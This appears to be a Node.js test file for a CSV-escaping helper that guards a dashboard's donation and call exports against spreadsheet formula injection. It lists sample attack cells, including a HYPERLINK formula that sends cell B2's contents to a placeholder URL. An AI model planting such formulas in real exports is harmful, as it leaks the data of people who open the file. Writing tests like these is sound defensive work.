import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";

import { csvCell } from "@/lib/utils/csv";

/**
 * Gift and call exports carried text strangers wrote — a donor name from the
 * public give form, a caller's transcript — straight into cells. One starting
 * with `=` ran as a formula when the treasurer opened the file.
 */

test("a cell that would run as a formula is shown as text", () => {
  assert.equal(csvCell('=HYPERLINK("https://x/?"&B2,"Open")'), `"'=HYPERLINK(""https://x/?""&B2,""Open"")"`);
  for (const attack of ["+cmd", "-2+3", "@SUM(A1)", "\tx", "\rx"]) {
    assert.ok(csvCell(attack).replace(/^"/, "").startsWith("'"), JSON.stringify(attack));
  }
});

test("numbers, including negative amounts, stay numbers", () => {
  assert.equal(csvCell("-10.00"), "-10.00");
  assert.equal(csvCell(25), "25");
  assert.equal(csvCell("Grace Church"), "Grace Church");
  assert.equal(csvCell(null), "");
  assert.equal(csvCell('Say "hi", ok'), '"Say ""hi"", ok"');
});

test("both exports use the safe cell", () => {
  for (const path of [
    "app/api/dashboard/giving/export/route.ts",
    "app/api/dashboard/voice-assistant/calls/export/route.ts",
  ]) {
    const source = readFileSync(path, "utf8");
    assert.match(source, /csvCell/);
    assert.doesNotMatch(source, /function escapeCsv/);
  }
});
